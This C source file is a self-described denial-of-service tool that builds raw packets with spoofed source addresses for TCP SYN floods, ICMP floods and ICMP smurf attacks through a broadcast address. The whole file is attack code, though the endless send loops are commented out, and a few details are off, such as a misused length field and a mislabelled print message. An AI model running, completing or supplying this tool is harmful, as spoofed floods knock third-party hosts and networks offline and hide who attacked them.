#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>

#include<netinet/tcp.h>
#include<netinet/ip.h>
#include<netinet/ip_icmp.h>
#include<netinet/udp.h>



// struct will be used to calculate the size of the tcp header
struct pseudo_tcp{
    struct in_addr src;
    struct in_addr dst;
    unsigned char padding;
    unsigned char protocol;
    unsigned char tcp_length;
    struct tcphdr tcp;
};



// functions to calculate the checksum of the network packets the functions code edited from the tutorial in http//enderunix.org/docs/en/rawipspoof

	
// function to calculate the checksum of the ip and icmp packets 
unsigned short check_sum(unsigned short *addr, int len)
    {
    int byte_left = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;

    while (byte_left > 1) // can be implemented as for loop for sum=0;len>0;len--
        {
        sum += *w++;
        byte_left -= 2; 
        }    
    if (byte_left == 1)
        {
        *((unsigned char *) &answer) = *(unsigned char *) w;
        sum += answer;
        }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
    }

// function to organise the tcp header to get the checksum 
 unsigned short organise_tcp_checksum(int src, int dst, unsigned short *addr, int len)
{
	struct pseudo_tcp buffer;
	u_short answer;

	memset(&buffer, 0, sizeof(buffer));
	buffer.src.s_addr = src;
	buffer.dst.s_addr = dst;
	buffer.padding = 0;
	buffer.protocol = IPPROTO_TCP;
	buffer.tcp_length = htons(len);
	memcpy(&(buffer.tcp), addr, len);
	answer = check_sum((unsigned short *)&buffer, 12 + len);
	return (answer);
}


// function that sends icmp echo requests
void icmp_echo(int sd, char* target, char* source_ip, int attack)
    {
    
    //network structs
    struct ip ip_header;
	struct icmp icmp_header;
	const int on = 1;
    struct sockaddr_in sin;
    // make a packet buffer
    u_char *packet;
    packet = (u_char *)malloc(60);
    
    // build IP header
    ip_header.ip_hl = 0x5;
    ip_header.ip_v = 0x4;
    ip_header.ip_tos = 0x0;
    ip_header.ip_len = htons(60); // header length
    ip_header.ip_id = htons(12343); // make random header id
    ip_header.ip_off = 0x0; // offset 
    ip_header.ip_ttl = 64; // max time to live
    ip_header.ip_p = IPPROTO_ICMP; //spesify the protocol
    ip_header.ip_sum = 0x0;
    
    if(attack ==1)
    {
        ip_header.ip_src.s_addr = inet_addr(target); // add your target ip 
        ip_header.ip_dst.s_addr = inet_addr(source_ip); // source ip address
        ip_header.ip_sum = check_sum((unsigned short *)&ip_header, sizeof(ip_header));
    }
    else
    {
        ip_header.ip_src.s_addr = inet_addr(source_ip); // add your target ip 
        ip_header.ip_dst.s_addr = inet_addr(target); // source ip address
        ip_header.ip_sum = check_sum((unsigned short *)&ip_header, sizeof(ip_header));        
    }

    memcpy(packet, &ip_header, sizeof(ip_header)); // copy the header to the packet

    // build ICMP header
    icmp_header.icmp_type = ICMP_ECHO;
    icmp_header.icmp_code = 0;
    icmp_header.icmp_id = 1000;
    icmp_header.icmp_seq = 0;
    icmp_header.icmp_cksum = 0;
	icmp_header.icmp_cksum = check_sum((unsigned short *)&icmp_header, 8);
    memcpy(packet + 20, &icmp_header, 8);
    
    
    //fill sockaddr_in struct with data
    memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = ip_header.ip_dst.s_addr;
    
    int counter = 1;
    //while (1) 
   // {
        
        if (sendto(sd, packet, 60, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr)) < 0)  {
		    printf("Error.. Failed to send packet");
		    exit(1);
        }
        else
        {
            printf("[%d] Icmp packet sent\n",counter);
            counter ++;
            
            // set program to sleep for one second (for testing purposes)
            sleep(1);
        }
    //}
    }


void syn_flood(int sd, char* target_ip,int target_port, char* source_ip)
{   
    struct tcphdr tcp;
    struct ip ip_header;
    const int on = 1;
 	struct sockaddr_in sin;
    // for tcp checksum
    struct pseudo_tcp pseudo_header;

    // make a packet buffer
    u_char *packet;
    packet = (u_char *)malloc(60);

    ip_header.ip_hl = 0x5;
    ip_header.ip_v = 0x4;
    ip_header.ip_tos = 0x0;
    ip_header.ip_len = sizeof(struct ip) + sizeof(struct tcphdr); // different in tcp
    ip_header.ip_id = htons(12830); // make random id
    ip_header.ip_off = 0x0; // offset 
    ip_header.ip_ttl = 64; // max time to live
    ip_header.ip_p = IPPROTO_TCP; // different in tcp
    ip_header.ip_sum = 0x0;
    ip_header.ip_src.s_addr = inet_addr(source_ip); // add your target ip 
    ip_header.ip_dst.s_addr = inet_addr(target_ip);
    ip_header.ip_sum = check_sum((unsigned short *)&ip_header, sizeof(ip_header)); //differenet in tcp
    memcpy(packet, &ip_header, sizeof(ip_header)); // copy the header to the packet


    tcp.th_sport = htons(3333);
	tcp.th_dport = htons(target_port);
	tcp.th_seq = htonl(0x131123);
	tcp.th_off = sizeof(struct tcphdr) / 4;
	tcp.th_flags = TH_SYN;
	tcp.th_win = htons(32768);
	tcp.th_sum = 0;
	tcp.th_sum = organise_tcp_checksum(ip_header.ip_src.s_addr, ip_header.ip_dst.s_addr, (unsigned short *)&tcp, sizeof(tcp));
	memcpy((packet + sizeof(ip_header)), &tcp, sizeof(tcp));

    memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = ip_header.ip_dst.s_addr;


    int counter = 1;
    //while (1) 
   // {
        if (sendto(sd, packet, 60, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr)) < 0)
            {
		    printf("Error.. Failed to send packet");
		    exit(1);
            }  
        else
        {
            printf("[%d] Icmp packet sent\n",counter);
            counter ++;
            sleep(1);
        }
    // }
}


int main(int argc, char **argv[])
    {
    // get user args
    char target_ip[20];
    char source_ip[20];
    char type[20];
    int target_port;    
    

    printf("\n\n\t **************** [ Dos Attacking tool ] ****************\n\n attacks supported:\n\t1- TCP_SYN Flood\n\t2- ICMP Flood\n\t3- ICMP Smurf \n\n");
    //get the attack type
    printf("Enter an attack type (syn_flood, smurf or icmp_flood): ");
    scanf("%s",type);

    // get the traget ip address
    printf("\n Enter your target ip: ");
    scanf("%s",target_ip);

    printf("\n Enter spoofed source ip or broadcast address(if you choosed smurf) you want: ");
    scanf("%s",source_ip);

    // check that ip address is valid
    if (inet_addr(target_ip) == -1 || inet_addr(source_ip) == -1)
    {
        printf("Invalid Ip addresses.. Please try again with valid options\n");
        exit(1);
    }

    if ((strcmp(type, "syn_flood")) == 0)
    {
        printf("\nEnter your target port: ");
        scanf("%d",&target_port);
    } 

    //networking structs 
    int sd;
    struct ip ip;
    struct icmp icmp;
    const int on = 1;
    struct sockaddr_in sin;
    
    // Socket creation.. type raw socket
    if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) 
    {
	    printf("Error.. Failed to create raw socket\n");
		exit(1);
	}

    // Tell the kernel that we are buiding the IP header 
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) 
    {
		printf("Error.. Failed to set socket operation\n");
		exit(1);
	}

    if ((strcmp(type, "syn_flood")) == 0)
    {
        printf("Starting TCP-SYN Flood attack...\n");
        syn_flood(sd,target_ip,target_port, source_ip);
    }
    
    else if ((strcmp(type, "smurf")) == 0)
	{
        printf("Starting ICMP smurf attack...\n");
        icmp_echo(sd,target_ip, source_ip,1);
    }

    else if ((strcmp(type, "icmp_flood")) == 0)
	{
        printf("Starting ICMP flood attack...\n");
        icmp_echo(sd,target_ip, source_ip,2);
    }

    else
    {
       printf("unknown attack type..\n available types are \" icmp_flood\",  \"syn_flood\" and \"smurf\" ");
       exit(1);
    }

    return 0;
    }